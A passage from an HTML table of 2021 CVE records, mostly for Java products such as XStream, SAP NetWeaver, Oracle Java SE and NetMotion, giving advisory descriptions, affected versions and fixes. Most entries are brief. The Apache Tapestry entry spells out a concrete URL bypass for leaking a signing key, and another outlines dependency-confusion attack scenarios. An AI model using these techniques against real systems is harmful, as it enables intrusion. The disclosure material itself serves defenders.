		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-28818">CVE-2021-28818</a></td>
		<td valign="top">The Rendezvous Routing Daemon (rvrd), Rendezvous Secure Routing Daemon (rvrsd), Rendezvous Secure Daemon (rvsd), Rendezvous Cache (rvcache), Rendezvous Secure C API, Rendezvous Java API, and Rendezvous .Net API components of TIBCO Software Inc.'s TIBCO Rendezvous and TIBCO Rendezvous Developer Edition contain a vulnerability that theoretically allows a low privileged attacker with local access on the Windows operating system to insert malicious software. The affected component can be abused to execute the malicious software inserted by the attacker with the elevated privileges of the component. This vulnerability results from the affected component searching for run-time artifacts outside of the installation hierarchy. Affected releases are TIBCO Software Inc.'s TIBCO Rendezvous: versions 8.5.1 and below and TIBCO Rendezvous Developer Edition: versions 8.5.1 and below.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-28472">CVE-2021-28472</a></td>
		<td valign="top">Visual Studio Code Maven for Java Extension Remote Code Execution Vulnerability

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-28398">CVE-2021-28398</a></td>
		<td valign="top">A privileged attacker in GeoNetwork before 3.12.0 and 4.x before 4.0.4 can use the directory harvester before-script to execute arbitrary OS commands remotely on the hosting infrastructure. A User Administrator or Administrator account is required to perform this. This occurs in the runBeforeScript method in harvesters/src/main/java/org/fao/geonet/kernel/harvest/harvester/localfilesystem/LocalFilesystemHarvester.java. The earliest affected version is 3.4.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27850">CVE-2021-27850</a></td>
		<td valign="top">A critical unauthenticated remote code execution vulnerability was found all recent versions of Apache Tapestry. The affected versions include 5.4.5, 5.5.0, 5.6.2 and 5.7.0. The vulnerability I have found is a bypass of the fix for CVE-2019-0195. Recap: Before the fix of CVE-2019-0195 it was possible to download arbitrary class files from the classpath by providing a crafted asset file URL. An attacker was able to download the file `AppModule.class` by requesting the URL `http://localhost:8080/assets/something/services/AppModule.class` which contains a HMAC secret key. The fix for that bug was a blacklist filter that checks if the URL ends with `.class`, `.properties` or `.xml`. Bypass: Unfortunately, the blacklist solution can simply be bypassed by appending a `/` at the end of the URL: `http://localhost:8080/assets/something/services/AppModule.class/` The slash is stripped after the blacklist check and the file `AppModule.class` is loaded into the response. This class usually contains the HMAC secret key which is used to sign serialized Java objects. With the knowledge of that key an attacker can sign a Java gadget chain that leads to RCE (e.g. CommonsBeanUtils1 from ysoserial). Solution for this vulnerability: * For Apache Tapestry 5.4.0 to 5.6.1, upgrade to 5.6.2 or later. * For Apache Tapestry 5.7.0, upgrade to 5.7.1 or later.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27635">CVE-2021-27635</a></td>
		<td valign="top">SAP NetWeaver AS for JAVA, versions - 7.20, 7.30, 7.31, 7.40, 7.50, allows an attacker authenticated as an administrator to connect over a network and submit a specially crafted XML file in the application because of missing XML Validation, this vulnerability enables attacker to fully compromise confidentiality by allowing them to read any file on the filesystem or fully compromise availability by causing the system to crash. The attack cannot be used to change any data so that there is no compromise as to integrity.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27621">CVE-2021-27621</a></td>
		<td valign="top">Information Disclosure vulnerability in UserAdmin application in SAP NetWeaver Application Server for Java, versions - 7.11,7.20,7.30,7.31,7.40 and 7.50 allows attackers to access restricted information by entering malicious server name.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27604">CVE-2021-27604</a></td>
		<td valign="top">In order to prevent XML External Entity vulnerability in SAP NetWeaver ABAP Server and ABAP Platform (Process Integration - Enterprise Service Repository JAVA Mappings), versions - 7.10, 7.20, 7.30, 7.31, 7.40, 7.50, SAP recommends to refer this note.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27601">CVE-2021-27601</a></td>
		<td valign="top">SAP NetWeaver AS Java (Applications based on HTMLB for Java) allows a basic-level authorized attacker to store a malicious file on the server. When a victim tries to open this file, it results in a Cross-Site Scripting (XSS) vulnerability and the attacker can read and modify data. However, the attacker does not have control over kind or degree.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27598">CVE-2021-27598</a></td>
		<td valign="top">SAP NetWeaver AS JAVA (Customer Usage Provisioning Servlet), versions - 7.31, 7.40, 7.50, allows an attacker to read some statistical data like product version, traffic, timestamp etc. because of missing authorization check in the servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27335">CVE-2021-27335</a></td>
		<td valign="top">KollectApps before 4.8.16c is affected by insecure Java deserialization, leading to Remote Code Execution via a ysoserial.payloads.CommonsCollections parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27198">CVE-2021-27198</a></td>
		<td valign="top">An issue was discovered in Visualware MyConnection Server before v11.1a. Unauthenticated Remote Code Execution can occur via Arbitrary File Upload in the web service when using a myspeed/sf?filename= URI. This application is written in Java and is thus cross-platform. The Windows installation runs as SYSTEM, which means that exploitation gives one Administrator privileges on the target system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-27084">CVE-2021-27084</a></td>
		<td valign="top">Visual Studio Code Java Extension Pack Remote Code Execution Vulnerability

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26915">CVE-2021-26915</a></td>
		<td valign="top">NetMotion Mobility before 11.73 and 12.x before 12.02 allows unauthenticated remote attackers to execute arbitrary code as SYSTEM because of Java deserialization in webrepdb StatusServlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26914">CVE-2021-26914</a></td>
		<td valign="top">NetMotion Mobility before 11.73 and 12.x before 12.02 allows unauthenticated remote attackers to execute arbitrary code as SYSTEM because of Java deserialization in MvcUtil valueStringToObject.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26913">CVE-2021-26913</a></td>
		<td valign="top">NetMotion Mobility before 11.73 and 12.x before 12.02 allows unauthenticated remote attackers to execute arbitrary code as SYSTEM because of Java deserialization in RpcServlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26912">CVE-2021-26912</a></td>
		<td valign="top">NetMotion Mobility before 11.73 and 12.x before 12.02 allows unauthenticated remote attackers to execute arbitrary code as SYSTEM because of Java deserialization in SupportRpcServlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26295">CVE-2021-26295</a></td>
		<td valign="top">Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26077">CVE-2021-26077</a></td>
		<td valign="top">Broken Authentication in Atlassian Connect Spring Boot (ACSB) in version 1.1.0 before 2.1.3 and from version 2.1.4 before 2.1.5: Atlassian Connect Spring Boot is a Java Spring Boot package for building Atlassian Connect apps. Authentication between Atlassian products and the Atlassian Connect Spring Boot app occurs with a server-to-server JWT or a context JWT. Atlassian Connect Spring Boot versions 1.1.0 before 2.1.3 and versions 2.1.4 before 2.1.5 erroneously accept context JWTs in lifecycle endpoints (such as installation) where only server-to-server JWTs should be accepted, permitting an attacker to send authenticated re-installation events to an app.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-26074">CVE-2021-26074</a></td>
		<td valign="top">Broken Authentication in Atlassian Connect Spring Boot (ACSB) from version 1.1.0 before version 2.1.3: Atlassian Connect Spring Boot is a Java Spring Boot package for building Atlassian Connect apps. Authentication between Atlassian products and the Atlassian Connect Spring Boot app occurs with a server-to-server JWT or a context JWT. Atlassian Connect Spring Boot versions from version 1.1.0 before version 2.1.3 erroneously accept context JWTs in lifecycle endpoints (such as installation) where only server-to-server JWTs should be accepted, permitting an attacker to send authenticated re-installation events to an app.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-25738">CVE-2021-25738</a></td>
		<td valign="top">Loading specially-crafted yaml with the Kubernetes Java Client library can lead to code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2438">CVE-2021-2438</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 12.2.0.1 and 19c. Easily exploitable vulnerability allows low privileged attacker having Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java VM. CVSS 3.1 Base Score 4.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2432">CVE-2021-2432</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: JNDI). The supported version that is affected is Java SE: 7u301. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-24105">CVE-2021-24105</a></td>
		<td valign="top">&lt;p&gt;Depending on configuration of various package managers it is possible for an attacker to insert a malicious package into a package manager's repository which can be retrieved and used during development, build, and release processes. This insertion could lead to remote code execution. We believe this vulnerability affects multiple package managers across multiple languages, including but not limited to: Python/pip, .NET/NuGet, Java/Maven, JavaScript/npm.&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Attack scenarios&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;An attacker could take advantage of this ecosystem-wide issue to cause harm in a variety of ways. The original attack scenarios were discovered by Alex Birsan and are detailed in their whitepaper, &lt;a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"&gt;Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies&lt;/a&gt;.&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;p&gt;With basic knowledge of the target ecosystems, an attacker could create an empty shell for a package and insert malicious code in the install scripts, give it a high version, and publish it to the public repository. Vulnerable victim machines will download the higher version of the package between the public and private repositories and attempt to install it. Due to code incompatibility it will probably error out upon import or upon compilation, making it easier to detect; however the attacker would have gained code execution by that point.&lt;/p&gt; &lt;/li&gt; &lt;li&gt;&lt;p&gt;An advanced attacker with some inside knowledge of the target could take a copy of a working package, insert the malicious code (in the package itself or in the install), and then publish it to a public repository. The package will likely install and import correctly, granting the attacker an initial foothold and persistence.&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;p&gt;These two methods could affect target organizations at any of these various levels:&lt;/p&gt; &lt;ul&gt; &lt;li&gt;Developer machines&lt;/li&gt; &lt;li&gt;An entire team if the configuration to import the malicious package is uploaded to a code repository&lt;/li&gt; &lt;li&gt;Continuous integration pipelines if they pull the malicious packages during the build, test, and/or deploy stages&lt;/li&gt; &lt;li&gt;Customers, download servers, production services if the malicious code has not been detected&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;This remote code execution vulnerability can only be addressed by reconfiguring installation tools and workflows, and not by correcting anything in the package repositories themselves. See the &lt;strong&gt;FAQ&lt;/strong&gt; section of this CVE for configuration guidance.&lt;/p&gt;

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-23895">CVE-2021-23895</a></td>
		<td valign="top">Deserialization of untrusted data vulnerability in McAfee Database Security (DBSec) prior to 4.8.2 allows a remote authenticated attacker to create a reverse shell with administrator privileges on the DBSec server via carefully constructed Java serialized object sent to the DBSec server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-23894">CVE-2021-23894</a></td>
		<td valign="top">Deserialization of untrusted data vulnerability in McAfee Database Security (DBSec) prior to 4.8.2 allows a remote unauthenticated attacker to create a reverse shell with administrator privileges on the DBSec server via carefully constructed Java serialized object sent to the DBSec server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2388">CVE-2021-2388</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2369">CVE-2021-2369</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Library). Supported versions that are affected are Java SE: 7u301, 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 4.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2341">CVE-2021-2341</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u301, 8u291, 11.0.11, 16.0.1; Oracle GraalVM Enterprise Edition: 20.3.2 and 21.1.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-23331">CVE-2021-23331</a></td>
		<td valign="top">This affects all versions of package com.squareup:connect. The method prepareDownloadFilecreates creates a temporary file with the permissions bits of -rw-r--r-- on unix-like systems. On unix-like systems, the system temporary directory is shared between users. As such, the contents of the file downloaded by downloadFileFromResponse will be visible to all other users on the local system. A workaround fix for this issue is to set the system property java.io.tmpdir to a safe directory as remediation. Note: This version of the SDK is end of life and no longer maintained, please upgrade to the latest version.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-23262">CVE-2021-23262</a></td>
		<td valign="top">Authenticated administrators may modify the main YAML configuration file and load a Java class resulting in RCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2302">CVE-2021-2302</a></td>
		<td valign="top">Vulnerability in the Oracle Platform Security for Java product of Oracle Fusion Middleware (component: OPSS). Supported versions that are affected are 11.1.1.9.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Platform Security for Java. Successful attacks of this vulnerability can result in takeover of Oracle Platform Security for Java. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-22569">CVE-2021-22569</a></td>
		<td valign="top">An issue in protobuf-java allowed the interleaving of com.google.protobuf.UnknownFieldSet fields in such a way that would be processed out of order. A small malicious payload can occupy the parser for several minutes by creating large numbers of short-lived objects that cause frequent, repeated pauses. We recommend upgrading libraries beyond the vulnerable versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2234">CVE-2021-2234</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-22097">CVE-2021-22097</a></td>
		<td valign="top">In Spring AMQP versions 2.2.0 - 2.2.18 and 2.3.0 - 2.3.10, the Spring AMQP Message object, in its toString() method, will deserialize a body for a message with content type application/x-java-serialized-object. It is possible to construct a malicious java.util.Dictionary object that can cause 100% CPU usage in the application if the toString() method is called.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21677">CVE-2021-21677</a></td>
		<td valign="top">Jenkins Code Coverage API Plugin 1.4.0 and earlier does not apply Jenkins JEP-200 deserialization protection to Java objects it deserializes from disk, resulting in a remote code execution vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2163">CVE-2021-2163</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u291, 8u281, 11.0.10, 16; Java SE Embedded: 8u281; Oracle GraalVM Enterprise Edition: 19.3.5, 20.3.1.2 and 21.0.0.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-2161">CVE-2021-2161</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u291, 8u281, 11.0.10, 16; Java SE Embedded: 8u281; Oracle GraalVM Enterprise Edition: 19.3.5, 20.3.1.2 and 21.0.0.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. It can also be exploited by supplying untrusted data to APIs in the specified Component. CVSS 3.1 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21492">CVE-2021-21492</a></td>
		<td valign="top">SAP NetWeaver Application Server Java(HTTP Service), versions - 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, does not sufficiently validate logon group in URLs, resulting in a content spoofing vulnerability when directory listing is enabled.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21491">CVE-2021-21491</a></td>
		<td valign="top">SAP Netweaver Application Server Java (Applications based on WebDynpro Java) versions 7.00, 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, allow an attacker to redirect users to a malicious site due to Reverse Tabnabbing vulnerabilities.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21485">CVE-2021-21485</a></td>
		<td valign="top">An unauthorized attacker may be able to entice an administrator to invoke telnet commands of an SAP NetWeaver Application Server for Java that allow the attacker to gain NTLM hashes of a privileged user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21479">CVE-2021-21479</a></td>
		<td valign="top">In SCIMono before 0.0.19, it is possible for an attacker to inject and execute java expression compromising the availability and integrity of the system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21430">CVE-2021-21430</a></td>
		<td valign="top">OpenAPI Generator allows generation of API client libraries (SDK generation), server stubs, documentation and configuration automatically given an OpenAPI Spec. Using `File.createTempFile` in JDK will result in creating and using insecure temporary files that can leave application and system data vulnerable to attacks. Auto-generated code (Java, Scala) that deals with uploading or downloading binary data through API endpoints will create insecure temporary files during the process. Affected generators: `java` (jersey2, okhttp-gson (default library)), `scala-finch`. The issue has been patched with `Files.createTempFile` and released in the v5.1.0 stable version.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21428">CVE-2021-21428</a></td>
		<td valign="top">Openapi generator is a java tool which allows generation of API client libraries (SDK generation), server stubs, documentation and configuration automatically given an OpenAPI Spec. openapi-generator-online creates insecure temporary folders with File.createTempFile during the code generation process. The insecure temporary folders store the auto-generated files which can be read and appended to by any users on the system. The issue has been patched with `Files.createTempFile` and released in the v5.1.0 stable version.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21369">CVE-2021-21369</a></td>
		<td valign="top">Hyperledger Besu is an open-source, MainNet compatible, Ethereum client written in Java. In Besu before version 1.5.1 there is a denial-of-service vulnerability involving the HTTP JSON-RPC API service. If username and password authentication is enabled for the HTTP JSON-RPC API service, then prior to making any requests to an API endpoint the requestor must use the login endpoint to obtain a JSON web token (JWT) using their credentials. A single user can readily overload the login endpoint with invalid requests (incorrect password). As the supplied password is checked for validity on the main vertx event loop and takes a relatively long time this can cause the processing of other valid requests to fail. A valid username is required for this vulnerability to be exposed. This has been fixed in version 1.5.1.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21351">CVE-2021-21351</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21350">CVE-2021-21350</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker to execute arbitrary code only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21349">CVE-2021-21349</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker to request data from internal resources that are not publicly available only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21348">CVE-2021-21348</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker to occupy a thread that consumes maximum CPU time and will never return. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21347">CVE-2021-21347</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21346">CVE-2021-21346</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21345">CVE-2021-21345</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker who has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21344">CVE-2021-21344</a></td>
		<td valign="top">XStream is a Java library to serialize objects to XML and back again. In XStream before version 1.4.16, there is a vulnerability which may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.16.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-21343">CVE-2021-21343</a></td>
